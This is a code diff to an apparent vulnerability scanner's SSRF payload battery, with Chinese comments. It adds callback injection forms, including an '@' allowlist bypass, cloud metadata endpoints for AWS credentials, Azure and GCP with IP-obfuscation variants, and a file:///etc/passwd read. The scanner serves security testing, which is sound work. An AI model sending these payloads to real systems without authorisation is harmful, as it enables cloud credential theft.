@@ -130,26 +130,50 @@ def _pt_battery() -> list[dict]:
 # 云元数据特征：必须是**只在响应体里出现、且不在我们发的 URL 路径里**的词，否则 URL 被原样
 # 回显就会误命中（如 security-credentials/iam/meta-data 都是 URL 路径词，已剔除）。
 _SSRF_META_SIGS = ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
-                   "InstanceProfile", "owner-account-id", "ssh-rsa"]
+                   "InstanceProfile", "owner-account-id", "ssh-rsa",
+                   # Azure IMDS instance 响应体里的键（不在 URL 路径里）
+                   "azEnvironment", "vmId", "subscriptionId",
+                   # GCP 元数据服务响应/报错头里的标识（请求无此 header 会 403 并回显它）
+                   "Metadata-Flavor"]
 
 
 def _ssrf_battery() -> list[dict]:
-    out = [
-        # 带外回连（证明服务端发起了请求；须配边界判别，弱）。{CALLBACK} 已是完整 URL。
-        {"value": "{CALLBACK}", "channel": "oob", "expect": None, "control": None,
-         "delay_target": 0.0, "technique": "ssrf:oob"},
-        {"value": "{CALLBACK}/x", "channel": "oob", "expect": None, "control": None,
-         "delay_target": 0.0, "technique": "ssrf:oob-path"},
+    # 1) 带外回连——占位感知的多种“注入形态”。真实 sink 很少把参数值原样当完整 URL 去请求，
+    #    更多是拼进更大的结构（只填 host / 拼前后缀 / query 子 URL / host 白名单）。整值替换会破坏
+    #    URL 结构导致请求根本发不出去（大量 clean 的主因）。故一个回连目标派生多种塞法，哪种能让
+    #    服务端真把请求发出来就命中。{CALLBACK}=完整URL(含token)；{CALLBACK_HOST}=host:port/token
+    #    （无 scheme，token 仍在 path → 带外命中可归因）。证明服务端发起请求=弱证据→疑似。
+    # 顺序即优先级：预算吃紧时（地板最少取前 2）要先覆盖最常见的两类 sink——
+    # “值=完整 URL” 和 “值=host（服务端补 scheme/path）”，故这两条放最前。
+    oob_forms = [
+        ("{CALLBACK}", "ssrf:oob"),                                  # 值=完整 URL（最常见）
+        ("{CALLBACK_HOST}", "ssrf:oob-hostonly"),                    # 值=host（服务端自行补 scheme/path）
+        ("//{CALLBACK_HOST}", "ssrf:oob-protorel"),                  # 协议相对
+        ("https://trusted.example.com@{CALLBACK_HOST}", "ssrf:oob-at"),  # @ 混淆绕 host 白名单
+        ("{CALLBACK}#", "ssrf:oob-frag"),                            # 服务端拼后缀 → 落到 fragment
+        ("{CALLBACK}?x=", "ssrf:oob-query"),                         # 服务端拼后缀 → 落到 query
+        ("{CALLBACK}/x", "ssrf:oob-path"),                           # 带路径
+        ("?url={CALLBACK}", "ssrf:oob-urlparam"),                    # 值被塞进既有 query 串
+        ("?target={CALLBACK}", "ssrf:oob-targetparam"),
     ]
-    # 信任边界：云元数据端点（含 IP 变形绕过）+ 阿里云
+    out = [{"value": v, "channel": "oob", "expect": None, "control": None,
+            "delay_target": 0.0, "technique": t} for v, t in oob_forms]
+    # 2) 信任边界：云元数据端点（AWS/阿里云/Azure/GCP，含 IP 变形绕过）。命中元数据体签名=confirmed。
     for url in ("http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "http://2852039166/latest/meta-data/",       # 169.254.169.254 十进制
                 "http://0xA9FEA9FE/latest/meta-data/",        # 十六进制
-                "http://100.100.100.200/latest/meta-data/"):  # 阿里云
+                "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6 映射
+                "http://100.100.100.200/latest/meta-data/",   # 阿里云
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
+                "http://metadata.google.internal/computeMetadata/v1/"):            # GCP
         out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
                     "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
-    # file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd）
+    # 3) 元数据端点的 host-only 形态（sink 只接受 host、自行补 scheme/path 时）
+    for host in ("169.254.169.254", "metadata.google.internal"):
+        out.append({"value": host, "channel": "inband", "expect": list(_SSRF_META_SIGS),
+                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta-host:{host[:18]}"})
+    # 4) file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd）
     out.append({"value": "file:///etc/passwd", "channel": "inband", "expect": list(_PT_PASSWD_SIGS),
                 "control": None, "delay_target": 0.0, "technique": "ssrf:file"})
     return out
